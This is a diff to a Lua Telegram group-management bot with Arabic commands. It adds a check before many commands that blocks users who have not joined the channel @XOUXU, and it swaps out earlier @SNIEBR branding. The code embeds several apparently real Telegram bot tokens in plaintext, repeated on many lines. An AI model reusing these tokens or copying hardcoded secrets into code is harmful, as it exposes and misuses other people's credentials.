+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل  الايدي بالصوره مفعل ', 1, 'md')
 else
@@ -4829,6 +4864,11 @@ datahmade:del('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل الايدي بالصوره') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل الايدي بالصوره معطل', 1, 'md')
 else
@@ -4854,6 +4894,11 @@ datahmade:set('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
 end
 end
 if (text and text == 'تفعيل ردود المدير') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ردود المدير بالفعل تم تفعيلها', 1, 'md')
 else
@@ -4871,6 +4916,11 @@ end
 end
 
 if (text and text == 'تفعيل الايدي') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ الايدي بالفعل تم تفعيله ', 1, 'md')
 else
@@ -4879,6 +4929,11 @@ datahmade:del('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل الايدي') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل الايدي بالفعل  ', 1, 'md')
 else
@@ -4887,19 +4942,39 @@ datahmade:set('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_,true)
 end
 end
 if (text and text == "تعطيل الرابط") then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل امر الروابط', 1, 'md')
 datahmade:set("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_,"ok")
 end
 if (text and text == "تفعيل الرابط") then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل امر الروابط', 1, 'md')
 datahmade:del("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_)
 end
 
 if (text and text == "تعطيل اوامر التحشيش") then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل اوامر التحشيش', 1, 'md')
 datahmade:set("Fun_Bots:"..bot_id..msg.chat_id_,"true")
 end
 if (text and text == "تفعيل اوامر التحشيش") then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل اوامر التحشيش', 1, 'md')
 datahmade:del("Fun_Bots:"..bot_id..msg.chat_id_)
 end
@@ -4921,6 +4996,11 @@ datahmade:set('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_,true)
 end
 end
 if text == ("تثبيت") and not is_owner(msg) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local id = msg.id_
 local msgs = {[0] = id}
 if not datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
@@ -5009,6 +5089,11 @@ sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع الملص
 end
 
 if text == 'تفعيل اللعبه' then   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1,[[*
 🎮| تم تفعيل الالعاب بنجاح  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -5025,11 +5110,16 @@ send(msg.chat_id_, msg.id_, 1,[[*
 💭|↫ ❨امثله❩ لعبه الامثله 
 🧲|↫ ❨المختلف❩ لعبه المختلفات
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-Ch  ☰ *[@SNIEBR] 🃏
+Ch  ☰ *[@XOUXU] 🃏
 ]], 1, 'md')
 datahmade:set('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_,true)  
 end
 if text == 'الالعاب' then   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1,[[*
 🎮| اهلا بك في الالعاب  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -5047,11 +5137,16 @@ send(msg.chat_id_, msg.id_, 1,[[*
 🧲|↫ ❨المختلف❩ لعبه المختلفات
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-Ch  ☰ *[@SNIEBR] 🃏
+Ch  ☰ *[@XOUXU] 🃏
 ]], 1, 'md')
 end
 
 if text == 'تعطيل اللعبه' then  
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 taha = '🎮┇ تم تعطيل اللعبه  ' 
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 datahmade:del('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) 
@@ -5630,6 +5725,11 @@ datahmade:set('SNIEBR:'..bot_id..'Num:kansers'..msg.chat_id_,Num)
 send(msg.chat_id_, msg.id_, 1, '\n🔖┇تم وضع عدد حروف الاسم {'..Num..'} حرف',1, 'md')
 end
 if (text == "قفل الكانسر") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local tsX_o = datahmade:get("lock_kansers:SNIEBR"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الكانسر ")
@@ -5649,10 +5749,10 @@ end
 end
 
 if (text == ("رفع مميز"))  and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
@@ -5671,10 +5771,10 @@ return false
 end
 if text and text:match("^رفع مميز @(.*)$") then
 local apmd = {string.match(text, "^(رفع مميز) @(.*)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false 
 end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
@@ -5700,10 +5800,10 @@ end
 
 if text and text:match("^رفع مميز (%d+)$") then
 local apmd = {string.match(text, "^(رفع مميز) (%d+)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
@@ -6489,7 +6589,12 @@ t = "📬┇ لا يوجد ردود مضافه"
 end  
 send(msg.chat_id_, msg.id_, 1, t, 1, 'html')  
 end  
-if text and text == 'منع' and msg.reply_to_message_id_ == 0 and is_mod(msg) then      
+if text and text == 'منع' and msg.reply_to_message_id_ == 0 and is_mod(msg) then 
